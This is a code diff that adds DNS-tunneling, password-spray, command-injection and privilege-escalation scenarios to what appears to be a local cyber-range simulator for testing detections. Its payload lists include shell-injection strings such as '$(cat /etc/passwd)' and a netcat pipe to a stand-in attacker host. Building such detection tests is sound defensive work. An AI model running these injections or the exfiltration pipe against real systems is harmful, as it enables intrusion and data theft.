@@ -114,6 +114,62 @@ RANGE_SCENARIOS: dict[str, RangeScenario] = {
         safety_notes=["The runner scans only hardcoded range-target ports, never user-supplied hosts."],
         expected_detections=["port_scan"],
     ),
+    "range_dns_tunneling": RangeScenario(
+        id="range_dns_tunneling",
+        name="Local DNS Tunneling Simulation",
+        description="Sends long encoded DNS-like queries to simulate covert data exfiltration over DNS.",
+        severity="high",
+        mitre_tactics=["Command and Control", "Exfiltration"],
+        mitre_techniques=["T1071.004", "T1048"],
+        target_path="/dns/query",
+        cli_examples=[
+            'curl -s -X POST http://127.0.0.1:8088/dns/query -H "Content-Type: application/json" -d "{\\"query\\":\\"c2VjcmV0LWRhdGEudHVuLmV4YW1wbGUubG9jYWw\\"}"',
+        ],
+        safety_notes=["Queries are processed only by the local disposable range target."],
+        expected_detections=["dns_tunneling_suspected"],
+    ),
+    "range_password_spray": RangeScenario(
+        id="range_password_spray",
+        name="Local Password Spray Simulation",
+        description="Attempts one common password across many usernames to emulate low-and-slow spraying.",
+        severity="high",
+        mitre_tactics=["Credential Access"],
+        mitre_techniques=["T1110.003"],
+        target_path="/auth/spray",
+        cli_examples=[
+            'curl -s -X POST http://127.0.0.1:8088/auth/spray -H "Content-Type: application/json" -d "{\\"username\\":\\"finance.manager\\",\\"password\\":\\"Winter2026!\\"}"',
+        ],
+        safety_notes=["Spray actions target only toy authentication logic with dummy users."],
+        expected_detections=["password_spray"],
+    ),
+    "range_command_injection": RangeScenario(
+        id="range_command_injection",
+        name="Local Command Injection Attempt",
+        description="Submits shell metacharacter payloads to a toy endpoint to simulate command injection.",
+        severity="high",
+        mitre_tactics=["Execution", "Initial Access"],
+        mitre_techniques=["T1059", "T1190"],
+        target_path="/exec",
+        cli_examples=[
+            'curl -s -X POST http://127.0.0.1:8088/exec -H "Content-Type: application/json" -d "{\\"input\\":\\"report.csv; whoami\\"}"',
+        ],
+        safety_notes=["No system commands are executed; payloads are logged and blocked in-app."],
+        expected_detections=["command_injection_attempt"],
+    ),
+    "range_privilege_escalation": RangeScenario(
+        id="range_privilege_escalation",
+        name="Local Privilege Escalation Simulation",
+        description="Generates suspicious admin elevation telemetry to mimic privilege escalation behavior.",
+        severity="critical",
+        mitre_tactics=["Privilege Escalation", "Persistence"],
+        mitre_techniques=["T1068", "T1548"],
+        target_path="/priv-esc",
+        cli_examples=[
+            'curl -s -X POST http://127.0.0.1:8088/priv-esc -H "Content-Type: application/json" -d "{\\"username\\":\\"analyst\\",\\"action\\":\\"sudo su -\\"}"',
+        ],
+        safety_notes=["Events are synthetic lab traces; no real privilege changes happen on host or container."],
+        expected_detections=["privilege_escalation_suspected"],
+    ),
 }
 
 
@@ -258,6 +314,65 @@ class RangeAttackRunner:
             except OSError:
                 pass
         return len(self.scan_ports)
+
+    def _run_range_dns_tunneling(self) -> int:
+        queries = [
+            "healthcheck.local",
+            "c2VjcmV0LXNlZ21lbnQtMDE=.corp.lab.local",
+            "Y3JlZGVudGlhbD1hZG1pbjpQYXNzMTIz.corp.lab.local",
+            "ZmlsZT1jdXN0b21lcnMuY3N2JmNodW5rPTM=.corp.lab.local",
+            "ZXhmaWw9cGF5cm9sbC1kYXRhJmNoZWNrPTQ=.corp.lab.local",
+        ]
+        with httpx.Client(timeout=10.0) as client:
+            for query in queries:
+                client.post(f"{self.target_url}/dns/query", json={"query": query})
+        return len(queries)
+
+    def _run_range_password_spray(self) -> int:
+        usernames = [
+            "admin",
+            "it.support",
+            "finance.manager",
+            "ceo.assistant",
+            "ops.lead",
+            "analyst",
+            "helpdesk",
+            "intern",
+            "hr.manager",
+            "developer",
+        ]
+        with httpx.Client(timeout=10.0) as client:
+            for username in usernames:
+                client.post(
+                    f"{self.target_url}/auth/spray",
+                    json={"username": username, "password": "Winter2026!"},
+                )
+        return len(usernames)
+
+    def _run_range_command_injection(self) -> int:
+        payloads = [
+            "report.csv",
+            "report.csv; whoami",
+            "backup.tar && id",
+            "$(cat /etc/passwd)",
+            "audit.log | nc attacker.local 4444",
+        ]
+        with httpx.Client(timeout=10.0) as client:
+            for payload in payloads:
+                client.post(f"{self.target_url}/exec", json={"input": payload})
+        return len(payloads)
+
+    def _run_range_privilege_escalation(self) -> int:
+        actions = [
+            {"username": "analyst", "action": "sudo -l"},
+            {"username": "analyst", "action": "sudo su -"},
+            {"username": "service.backup", "action": "token::elevate"},
+            {"username": "service.backup", "action": "add user to administrators"},
+        ]
+        with httpx.Client(timeout=10.0) as client:
+            for item in actions:
+                client.post(f"{self.target_url}/priv-esc", json=item)
+        return len(actions)
 
 
 def logs_to_events(logs: list[dict[str, Any]]) -> list[EventCreate]:
